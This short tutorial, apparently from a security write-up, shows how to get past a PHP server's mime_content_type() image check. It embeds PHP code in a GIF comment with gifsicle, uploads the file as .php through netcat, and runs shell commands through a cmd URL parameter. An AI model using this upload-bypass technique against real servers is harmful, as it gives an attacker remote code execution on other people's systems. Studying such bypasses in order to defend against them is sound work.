### Get Around of mime_content_type or finfo
In this example we get around the php's *mime_content_type()* function.

\_ The server accept **GIF** images and use only the *mime_content_type()* function for verify that the image is valid. If we put **PHP** code in comment of the GIF, like php is a template language with a php extension the GIF will be executed.

\_ For insert comment in GIF file we use the following command :

``gifsicle < spmUM.gif -- comment "`cat exploit.php`" > output.php``

 Now we can upload our file: `nc upload 80 < raw`. After that we can execute the script from a navigator (e.g : http://hostname/upload/uploads/?cmd=touch+newfile)
